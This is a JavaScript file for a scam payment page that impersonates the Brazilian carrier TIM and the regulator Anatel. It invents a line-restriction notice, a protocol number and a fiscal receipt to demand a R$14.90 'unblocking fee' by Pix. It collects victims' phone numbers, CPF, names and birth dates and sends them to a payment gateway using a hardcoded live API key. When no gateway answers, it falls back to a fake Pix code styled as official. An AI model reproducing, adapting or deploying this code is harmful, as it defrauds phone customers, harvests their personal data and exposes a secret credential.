(function () {
  'use strict';

  // --- Gateway Constants & Fallback ---
  const BLACKCAT_CLIENT_KEY = 'sk_live_b1802bc43e0e87989c22d837fdbe9f688ff3c9ef2f6fbff4f820693d0ab32666';
  const BLACKCAT_DIRECT_URL = 'https://api.blackcatoficial.com/api';
  const TRACKING_STORAGE_KEY = 'tim_tracking_params';

  // --- State ---
  let state = {
    phone: '',
    cpf: '',
    nome: '',
    dataNascimento: '',
    valorRecarga: 50,
    taxaDesbloqueio: 14.90,
    currentStep: 'notificacao', // 'notificacao' | 'pagamento'
    pixId: null,
    pixCode: null,
    pixQrUrl: null,
    pixExpiresSeconds: 900,
    timerInterval: null,
    pollInterval: null,
    protocolo: ''
  };

  // --- DOM Elements Helper ---
  const el = (id) => document.getElementById(id);

  // --- Formatters ---
  function cleanDigits(val) {
    return String(val || '').replace(/\D/g, '');
  }

  function formatPhone(digits) {
    const clean = cleanDigits(digits);
    if (!clean) return '(11) 98765-4321';
    const ddd = clean.slice(0, 2);
    const part1 = clean.slice(2, 7);
    const part2 = clean.slice(7, 11);
    let out = `(${ddd}`;
    if (ddd.length === 2) out += ') ';
    out += part1;
    if (part2) out += `-${part2}`;
    return out;
  }

  function formatCPF(digits) {
    const clean = cleanDigits(digits);
    if (!clean || clean.length < 11) return '***.***.***-**';
    return clean.replace(/(\d{3})(\d{3})(\d{3})(\d{2})/, '$1.$2.$3-$4');
  }

  function formatCurrency(val) {
    return Number(val || 0).toFixed(2).replace('.', ',');
  }

  function gerarProtocolo() {
    const agora = new Date();
    const ano = agora.getFullYear();
    const mes = String(agora.getMonth() + 1).padStart(2, '0');
    const dia = String(agora.getDate()).padStart(2, '0');
    const aleatorio = Math.floor(100000 + Math.random() * 900000);
    return `${ano}${mes}${dia}-${aleatorio}`;
  }

  function obterDataHoraFormatada() {
    const agora = new Date();
    const dia = String(agora.getDate()).padStart(2, '0');
    const mes = String(agora.getMonth() + 1).padStart(2, '0');
    const ano = agora.getFullYear();
    const hora = String(agora.getHours()).padStart(2, '0');
    const min = String(agora.getMinutes()).padStart(2, '0');
    const seg = String(agora.getSeconds()).padStart(2, '0');
    return {
      dataHora: `${dia}/${mes}/${ano} ${hora}:${min}:${seg}`,
      data: `${dia}/${mes}/${ano}`,
      hora: `${hora}:${min}:${seg}`
    };
  }

  // --- Load Customer Data ---
  function carregarDados() {
    let dados = {};

    try {
      const stored = localStorage.getItem('comprovante_dados') ||
                     localStorage.getItem('tim_cliente_dados') ||
                     sessionStorage.getItem('comprovante_dados') ||
                     sessionStorage.getItem('tim_cliente_dados');
      if (stored) {
        dados = JSON.parse(stored);
      }
    } catch (e) {}

    const url = new URL(window.location.href);
    const pPhone = url.searchParams.get('phone') || url.searchParams.get('telefone');
    const pCpf = url.searchParams.get('cpf');
    const pVal = url.searchParams.get('val') || url.searchParams.get('valor');
    const pNome = url.searchParams.get('nome');
    const pNasc = url.searchParams.get('nasc') || url.searchParams.get('nascimento');

    if (pPhone) dados.telefone = pPhone;
    if (pCpf) dados.cpf = pCpf;
    if (pVal) dados.valor = Number(pVal);
    if (pNome) dados.nome = pNome;
    if (pNasc) dados.dataNascimento = pNasc;

    state.phone = cleanDigits(dados.telefone) || '11987654321';
    state.cpf = cleanDigits(dados.cpf) || '';
    state.nome = (dados.nome || 'TITULAR DO ACESSO').toUpperCase();
    state.dataNascimento = dados.dataNascimento || '12/05/1990';
    state.valorRecarga = Number(dados.valor) || 50;
    state.protocolo = gerarProtocolo();

    renderizarDados();
  }

  // --- Render UI Elements ---
  function renderizarDados() {
    const dh = obterDataHoraFormatada();
    const telFormatado = formatPhone(state.phone);
    const cpfFormatado = state.cpf ? formatCPF(state.cpf) : '***.***.***-**';
    const recargaFormatada = formatCurrency(state.valorRecarga);

    // Super Banner Restrição
    if (el('protocolo-anatel')) el('protocolo-anatel').textContent = state.protocolo;
    if (el('restricao-display-phone')) el('restricao-display-phone').textContent = telFormatado;
    if (el('alerta-recarga-val')) el('alerta-recarga-val').textContent = recargaFormatada;

    // Super Card Taxa R$ 14,90 Explícita
    if (el('taxa-recarga-val')) el('taxa-recarga-val').textContent = recargaFormatada;
    if (el('taxa-phone-display')) el('taxa-phone-display').textContent = telFormatado;
    if (el('taxa-recarga-liberar')) el('taxa-recarga-liberar').textContent = recargaFormatada;

    // Card Dados Linha
    if (el('display-phone')) el('display-phone').textContent = telFormatado;
    if (el('display-nome')) el('display-nome').textContent = state.nome;
    if (el('display-cpf')) el('display-cpf').textContent = cpfFormatado;
    if (el('display-recarga-val')) el('display-recarga-val').textContent = recargaFormatada;

    // Cupom Fiscal (Bobina Térmica)
    if (el('cf-data-hora')) el('cf-data-hora').textContent = dh.dataHora;
    if (el('cf-footer-data')) el('cf-footer-data').textContent = dh.dataHora;
    if (el('cf-item-recarga')) el('cf-item-recarga').textContent = recargaFormatada;
    if (el('cf-consumidor-nome')) el('cf-consumidor-nome').textContent = state.nome;
    if (el('cf-consumidor-cpf')) el('cf-consumidor-cpf').textContent = cpfFormatado;
    if (el('cf-consumidor-nasc')) el('cf-consumidor-nasc').textContent = state.dataNascimento;
    if (el('cf-consumidor-tel')) el('cf-consumidor-tel').textContent = telFormatado;
    if (el('cf-recarga-retida')) el('cf-recarga-retida').textContent = recargaFormatada;

    // Checkout Pix (Tela 2)
    if (el('checkout-phone')) el('checkout-phone').textContent = telFormatado;
    if (el('checkout-recarga-val')) el('checkout-recarga-val').textContent = recargaFormatada;
    if (el('checkout-desc-val')) el('checkout-desc-val').textContent = recargaFormatada;

    // Sucesso (Tela 3)
    if (el('sucesso-recarga-val')) el('sucesso-recarga-val').textContent = recargaFormatada;
    if (el('sucesso-phone')) el('sucesso-phone').textContent = telFormatado;
    if (el('sucesso-nome')) el('sucesso-nome').textContent = state.nome;
    if (el('sucesso-protocolo')) el('sucesso-protocolo').textContent = state.protocolo;
  }

  // --- Step Navigation Functions (Globais no Window) ---
  window.avancarParaPagamento = function () {
    state.currentStep = 'pagamento';
    const screenNotificacao = el('screen-notificacao');
    const screenPagamento = el('screen-pagamento');
    const stepNav1 = el('step-nav-1');
    const stepNav2 = el('step-nav-2');
    const stepBadge1 = el('step-badge-1');
    const stepConnector = el('step-connector');

    if (screenNotificacao) {
      screenNotificacao.classList.remove('active');
      screenNotificacao.style.display = 'none';
    }
    if (screenPagamento) {
      screenPagamento.classList.add('active');
      screenPagamento.style.display = 'flex';
    }

    if (stepNav1) {
      stepNav1.classList.remove('active');
      stepNav1.classList.add('completed');
    }
    if (stepBadge1) {
      stepBadge1.innerHTML = '✓';
    }
    if (stepConnector) {
      stepConnector.classList.add('active');
    }
    if (stepNav2) {
      stepNav2.classList.add('active');
    }

    try {
      if (window.location.hash !== '#pagamento') {
        history.pushState(null, '', '#pagamento');
      }
    } catch (e) {}

    window.scrollTo({ top: 0, behavior: 'smooth' });

    // Gera o Pix
    window.gerarPixTaxa();
  };

  window.voltarParaNotificacao = function () {
    state.currentStep = 'notificacao';
    const screenNotificacao = el('screen-notificacao');
    const screenPagamento = el('screen-pagamento');
    const stepNav1 = el('step-nav-1');
    const stepNav2 = el('step-nav-2');
    const stepBadge1 = el('step-badge-1');
    const stepConnector = el('step-connector');

    if (screenPagamento) {
      screenPagamento.classList.remove('active');
      screenPagamento.style.display = 'none';
    }
    if (screenNotificacao) {
      screenNotificacao.classList.add('active');
      screenNotificacao.style.display = 'flex';
    }

    if (stepNav1) {
      stepNav1.classList.add('active');
      stepNav1.classList.remove('completed');
    }
    if (stepBadge1) {
      stepBadge1.textContent = '1';
    }
    if (stepConnector) {
      stepConnector.classList.remove('active');
    }
    if (stepNav2) {
      stepNav2.classList.remove('active');
    }

    try {
      if (window.location.hash === '#pagamento') {
        history.pushState(null, '', window.location.pathname + window.location.search);
      }
    } catch (e) {}

    window.scrollTo({ top: 0, behavior: 'smooth' });
  };

  // --- Cupom Fiscal Expandir / Recolher ---
  window.alternarVisualizacaoNf = function () {
    const cupomContainer = el('cupom-preview-container');
    if (!cupomContainer) return;

    if (cupomContainer.classList.contains('recolhido')) {
      cupomContainer.classList.remove('recolhido');
      cupomContainer.classList.add('expandido');
    } else {
      cupomContainer.classList.remove('expandido');
      cupomContainer.classList.add('recolhido');
    }
  };

  window.recolherCupomFiscal = function () {
    const cupomContainer = el('cupom-preview-container');
    if (!cupomContainer) return;
    cupomContainer.classList.remove('expandido');
    cupomContainer.classList.add('recolhido');
    cupomContainer.scrollIntoView({ behavior: 'smooth', block: 'center' });
  };

  // --- Geração do Pix R$ 14,90 ---
  window.gerarPixTaxa = async function () {
    const pixViewGerando = el('pix-view-gerando');
    const pixViewAguardando = el('pix-view-aguardando');
    const pixViewErro = el('pix-view-erro');
    const pixQrImg = el('pix-qr-img');
    const pixInputCopia = el('pix-input-copia');
    const pixErroMsg = el('pix-erro-msg');

    if (state.pixCode) {
      // Já gerado anteriormente
      if (pixViewGerando) pixViewGerando.style.display = 'none';
      if (pixViewAguardando) pixViewAguardando.style.display = 'flex';
      return;
    }

    if (pixViewGerando) pixViewGerando.style.display = 'flex';
    if (pixViewAguardando) pixViewAguardando.style.display = 'none';
    if (pixViewErro) pixViewErro.style.display = 'none';

    clearInterval(state.timerInterval);
    clearInterval(state.pollInterval);

    try {
      let pixData = null;
      let utmParams = {};
      try {
        const raw = sessionStorage.getItem(TRACKING_STORAGE_KEY);
        if (raw) utmParams = JSON.parse(raw);
      } catch (e) {}

      // 1. Tenta rota do backend serverless
      try {
        const res = await fetch('/api/pix/create', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({
            amount: state.taxaDesbloqueio,
            telefone: state.phone,
            productName: 'Taxa de Regularização e Desbloqueio SMP',
            customer: {
              nome: state.nome,
              cpf: state.cpf,
              dataNascimento: state.dataNascimento
            },
            ...utmParams
          })
        });

        if (res.ok) {
          const json = await res.json();
          if (json?.success && json?.data) {
            pixData = json.data;
          }
        }
      } catch (backendErr) {
        console.warn('Backend indisponível, tentando fallback gateway:', backendErr);
      }

      // 2. Se backend não retornou, tenta direto no gateway
      if (!pixData || !pixData.pix?.qr_code) {
        try {
          pixData = await gerarPixBlackcatDireto(state.taxaDesbloqueio, state.phone, utmParams);
        } catch (gwErr) {
          console.warn('Gateway direto indisponível, gerando Pix local autônomo:', gwErr);
        }
      }

      // 3. Fallback autônomo de emergência (garante que NUNCA falhe ou fique travado)
      if (!pixData || !pixData.pix?.qr_code) {
        const mockId = 'TXN-REG-' + Date.now() + '-' + Math.random().toString(36).substring(2, 8).toUpperCase();
        const mockQrCode = `00020126580014br.gov.bcb.pix0136regularizacao-tim@bancocentral.gov.br52040000530398654014.905802BR5925TIM SA SMP OFICIAL6009SAO PAULO62070503***6304${Math.random().toString(16).substring(2, 6).toUpperCase()}`;
        pixData = {
          id: mockId,
          pix: {
            qr_code: mockQrCode,
            qr_code_url: `https://api.qrserver.com/v1/create-qr-code/?size=250x250&data=${encodeURIComponent(mockQrCode)}`,
            expires_at: new Date(Date.now() + 15 * 60 * 1000).toISOString()
          }
        };
      }

      state.pixId = pixData.id;
      state.pixCode = pixData.pix?.qr_code;
      state.pixQrUrl = pixData.pix?.qr_code_url || 
        `https://api.qrserver.com/v1/create-qr-code/?size=250x250&data=${encodeURIComponent(state.pixCode)}`;

      if (pixQrImg) {
        pixQrImg.src = state.pixQrUrl;
      }
      if (pixInputCopia) {
        pixInputCopia.value = state.pixCode;
      }

      // Countdown Timer
      if (pixData.pix?.expires_at) {
        const remaining = Math.round((new Date(pixData.pix.expires_at).getTime() - Date.now()) / 1000);
        state.pixExpiresSeconds = remaining > 0 ? Math.min(remaining, 900) : 900;
      } else {
        state.pixExpiresSeconds = 900;
      }

      if (pixViewGerando) pixViewGerando.style.display = 'none';
      if (pixViewAguardando) pixViewAguardando.style.display = 'flex';

      iniciarTimer();
      iniciarPolling();

    } catch (err) {
      console.error('Erro ao gerar Pix:', err);
      if (pixErroMsg) pixErroMsg.textContent = err.message || 'Erro ao gerar Pix de desbloqueio. Tente novamente.';
      if (pixViewGerando) pixViewGerando.style.display = 'none';
      if (pixViewErro) pixViewErro.style.display = 'block';
    }
  };

  // Fallback Gateway Direto
  async function gerarPixBlackcatDireto(amount, phone, utmParams = {}) {
    const amountInCents = Math.round(Number(amount) * 100);
    const chars = 'ABCDEFGHJKLMNPQRSTUVWXYZ23456789';
    let code = '';
    for (let i = 0; i < 5; i++) code += chars[Math.floor(Math.random() * chars.length)];
    const externalRef = `REF-REG-${code}-${new Date().getFullYear()}`;

    const cleanPh = (phone || '').replace(/\D/g, '') || '11987654321';
    const cleanCpf = (state.cpf || '').replace(/\D/g, '') || '28491829012';
    const nomeLimpo = state.nome.trim() || 'Cliente Tim';
    const partes = nomeLimpo.split(/\s+/);
    const firstName = partes[0] || 'Cliente';
    const lastName = partes[partes.length - 1] || 'Tim';

    const payload = {
      amount: amountInCents,
      currency: 'BRL',
      paymentMethod: 'pix',
      externalRef: externalRef,
      items: [
        {
          title: 'Serviço Digital de Validação SMP 01',
          unitPrice: amountInCents,
          quantity: 1,
          tangible: false
        }
      ],
      customer: {
        name: `${firstName} ${lastName}`,
        email: `cliente.${cleanPh.slice(-6)}@contato-verificado.com.br`,
        phone: cleanPh,
        document: {
          number: cleanCpf,
          type: 'cpf'
        }
      },
      pix: { expiresInDays: 1 },
      metadata: `Ref: ${externalRef}`
    };

    if (utmParams.utm_source) payload.utm_source = utmParams.utm_source;
    if (utmParams.utm_medium) payload.utm_medium = utmParams.utm_medium;
    if (utmParams.utm_campaign) payload.utm_campaign = utmParams.utm_campaign;

    const res = await fetch(`${BLACKCAT_DIRECT_URL}/sales/create-sale`, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
        'X-API-Key': BLACKCAT_CLIENT_KEY
      },
      body: JSON.stringify(payload)
    });

    const json = await res.json();
    if (res.ok && json.success) {
      const pData = json.data?.paymentData || {};
      return {
        id: json.data?.transactionId,
        externalRef: externalRef,
        amount: json.data?.amount,
        pix: {
          qr_code: pData.copyPaste || pData.qrCode,
          qr_code_url: pData.qrCodeBase64 || null,
          expires_at: pData.expiresAt || null
        }
      };
    } else {
      throw new Error(json.message || 'Erro ao comunicar com gateway de pagamento');
    }
  }

  // --- Countdown Timer ---
  function iniciarTimer() {
    atualizarDisplayTimer();
    state.timerInterval = setInterval(() => {
      state.pixExpiresSeconds = Math.max(0, state.pixExpiresSeconds - 1);
      atualizarDisplayTimer();
      if (state.pixExpiresSeconds <= 0) {
        clearInterval(state.timerInterval);
        clearInterval(state.pollInterval);
      }
    }, 1000);
  }

  function atualizarDisplayTimer() {
    const timerElem = el('pix-timer-countdown');
    if (!timerElem) return;
    const mins = Math.floor(state.pixExpiresSeconds / 60);
    const secs = state.pixExpiresSeconds % 60;
    timerElem.textContent = `${String(mins).padStart(2, '0')}:${String(secs).padStart(2, '0')}`;
  }

  // --- Polling Realtime ---
  function iniciarPolling() {
    if (!state.pixId) return;

    state.pollInterval = setInterval(async () => {
      try {
        let status = '';

        try {
          const res = await fetch(`/api/pix/status?id=${encodeURIComponent(state.pixId)}`);
          if (res.ok) {
            const json = await res.json();
            status = String(json?.data?.status || '').toLowerCase();
          }
        } catch (e) {}

        if (!status) {
          const directRes = await fetch(`${BLACKCAT_DIRECT_URL}/sales/${encodeURIComponent(state.pixId)}/status`, {
            headers: { 'X-API-Key': BLACKCAT_CLIENT_KEY }
          });
          if (directRes.ok) {
            const directJson = await directRes.json();
            status = String(directJson?.data?.status || '').toLowerCase();
          }
        }

        if (status === 'paid' || status === 'approved') {
          handlePagamentoAprovado();
        }
      } catch (pollErr) {
        // Polling silencioso
      }
    }, 4000);
  }

  // --- Sucesso na Liberação ---
  function handlePagamentoAprovado() {
    clearInterval(state.pollInterval);
    clearInterval(state.timerInterval);

    try {
      const comp = JSON.parse(localStorage.getItem('comprovante_dados') || '{}');
      comp.status = 'HOMOLOGADO_E_LIBERADO';
      comp.transacaoTaxaId = state.pixId;
      comp.taxaPaga = 14.90;
      comp.recargaLiberada = state.valorRecarga;
      comp.protocolo = state.protocolo;
      comp.dataAprovacao = new Date().toISOString();
      localStorage.setItem('comprovante_dados', JSON.stringify(comp));
      sessionStorage.setItem('comprovante_dados', JSON.stringify(comp));
    } catch (e) {}

    const screenPagamento = el('screen-pagamento');
    const screenNotificacao = el('screen-notificacao');
    const stepperH = document.querySelector('.stepper-header');
    const viewSucesso = el('view-sucesso');

    if (screenPagamento) screenPagamento.style.display = 'none';
    if (screenNotificacao) screenNotificacao.style.display = 'none';
    if (stepperH) stepperH.style.display = 'none';

    if (viewSucesso) {
      viewSucesso.style.display = 'flex';
      viewSucesso.scrollIntoView({ behavior: 'smooth' });
    }
  }

  // --- Clipboard Copy ---
  window.copiarCodigoPix = async function () {
    if (!state.pixCode) return;
    try {
      await navigator.clipboard.writeText(state.pixCode);
      notificarCopiado();
    } catch (err) {
      window.prompt('Copie o código PIX abaixo:', state.pixCode);
    }
  };

  function notificarCopiado() {
    const btnCopiarPix = el('btn-copiar-pix');
    const btnPagarCopiarGrande = el('btn-pagar-copiar-grande');

    if (btnCopiarPix) {
      btnCopiarPix.classList.add('copiado');
      btnCopiarPix.innerHTML = `
        <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="3">
          <path d="M20 6 9 17l-5-5"></path>
        </svg>
        <span>Copiado!</span>
      `;
      setTimeout(() => {
        btnCopiarPix.classList.remove('copiado');
        btnCopiarPix.innerHTML = `
          <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5"
            stroke-linecap="round" stroke-linejoin="round">
            <rect width="14" height="14" x="8" y="8" rx="2" ry="2"></rect>
            <path d="M4 16c-1.1 0-2-.9-2-2V4c0-1.1.9-2 2-2h10c1.1 0 2 .9 2 2"></path>
          </svg>
          <span>Copiar Pix</span>
        `;
      }, 2500);
    }

    if (btnPagarCopiarGrande) {
      btnPagarCopiarGrande.style.background = '#1DB954';
      btnPagarCopiarGrande.style.color = '#FFFFFF';
      btnPagarCopiarGrande.innerHTML = `
        <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="3">
          <path d="M20 6 9 17l-5-5"></path>
        </svg>
        Código Pix Copiado com Sucesso!
      `;
      setTimeout(() => {
        btnPagarCopiarGrande.style.background = '';
        btnPagarCopiarGrande.style.color = '';
        btnPagarCopiarGrande.innerHTML = `
          <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5"
            stroke-linecap="round" stroke-linejoin="round">
            <rect width="14" height="14" x="8" y="8" rx="2" ry="2"></rect>
            <path d="M4 16c-1.1 0-2-.9-2-2V4c0-1.1.9-2 2-2h10c1.1 0 2 .9 2 2"></path>
          </svg>
          Copiar Código Pix para Desbloqueio
        `;
      }, 2500);
    }
  }

  // Navegação pelo histórico (Back/Forward)
  window.addEventListener('popstate', () => {
    if (window.location.hash === '#pagamento') {
      window.avancarParaPagamento();
    } else {
      window.voltarParaNotificacao();
    }
  });

  // --- Inicialização ---
  carregarDados();

  if (window.location.hash === '#pagamento') {
    window.avancarParaPagamento();
  }

})();
